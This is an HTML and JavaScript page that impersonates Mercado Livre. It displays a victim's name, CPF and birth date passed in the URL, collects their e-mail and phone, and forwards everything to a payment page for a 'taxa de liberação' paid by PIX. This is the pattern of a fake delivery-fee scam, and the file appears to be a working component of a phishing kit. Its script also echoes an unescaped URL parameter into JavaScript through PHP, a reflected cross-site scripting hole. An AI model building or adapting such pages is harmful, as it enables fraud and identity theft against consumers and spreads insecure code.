<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Validação — Mercado Livre</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --ml-blue: #3483fa; --bg: #f0f0f0; --white: #fff; --text: #333; --muted: #666; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: Roboto, sans-serif; background: var(--bg); color: var(--text); padding-bottom: 90px; }
        header { background: var(--white); padding: 14px 16px; text-align: center; font-weight: 700; border-bottom: 3px solid #ffe600; }
        .card { background: var(--white); margin: 12px; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.06); }
        h2 { font-size: 18px; margin-bottom: 8px; }
        p.sub { color: var(--muted); font-size: 14px; line-height: 1.5; margin-bottom: 16px; }
        .info { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 10px; }
        .info span:first-child { color: var(--muted); }
        label { display: block; font-size: 14px; margin: 12px 0 6px; font-weight: 500; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; }
        footer { position: fixed; bottom: 0; left: 0; right: 0; background: var(--white); padding: 12px 16px; box-shadow: 0 -2px 8px rgba(0,0,0,.08); }
        .submit-btn { width: 100%; padding: 14px; background: var(--ml-blue); color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>
    <header>Mercado Livre — Validação</header>
    <div class="card">
        <h2>Confirme seus dados</h2>
        <p class="sub">Informe e-mail e telefone para prosseguir ao pagamento da taxa de liberação (mesmo fluxo do projeto entregas).</p>
        <div class="info"><span>Nome</span><span id="nome">--</span></div>
        <div class="info"><span>CPF</span><span id="cpf">--</span></div>
        <div class="info"><span>Nascimento</span><span id="nascimento">--</span></div>
        <form id="validation-form" method="POST">
            <input type="hidden" name="cpf" id="input-cpf">
            <input type="hidden" name="nome" id="input-nome">
            <label for="email">E-mail</label>
            <input type="email" name="email" id="email" placeholder="seuemail@exemplo.com" required>
            <label for="telefone">Telefone celular</label>
            <input type="tel" name="telefone" id="telefone" placeholder="(11) 99999-9999" required maxlength="15">
        </form>
    </div>
    <footer>
        <button type="submit" form="validation-form" class="submit-btn" id="submit-btn">Validar e pagar com PIX</button>
    </footer>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const params = new URLSearchParams(window.location.search);
            const nome = params.get("nome") || "Cliente";
            const cpf = params.get("cpf") || "";
            const nascimento = params.get("nascimento") || "—";
            document.getElementById("nome").textContent = nome;
            document.getElementById("cpf").textContent = cpf;
            document.getElementById("nascimento").textContent = nascimento;
            document.getElementById("input-cpf").value = cpf;
            document.getElementById("input-nome").value = nome;
        });
        
        document.getElementById("telefone").addEventListener("input", function (e) {
            let v = e.target.value.replace(/\D/g, "").slice(0, 11);
            if (v.length > 10) v = v.replace(/^(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
            else if (v.length > 6) v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
            else if (v.length > 2) v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
            else if (v.length) v = "(" + v;
            e.target.value = v;
        });
        
        // Processa o formulário
        document.getElementById("validation-form").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById("submit-btn");
            const originalText = submitBtn.textContent;
            
            // Desabilita o botão e mostra loading
            submitBtn.disabled = true;
            submitBtn.textContent = "PROCESSANDO...";
            
            // Coleta os dados do formulário
            const nome = document.getElementById("input-nome").value;
            const cpf = document.getElementById("input-cpf").value;
            const email = document.getElementById("email").value;
            const telefone = document.getElementById("telefone").value;
            const nascimento = "<?php echo $_GET['nascimento'] ?? ''; ?>";
            
            // Redireciona para a página de resumo de pagamento
            const params = new URLSearchParams({
                nome: nome,
                cpf: cpf,
                email: email,
                telefone: telefone,
                nascimento: nascimento
            });
            
            window.location.href = 'resumo_pagamento.php?' + params.toString();
        });
    </script>
</body>
</html>
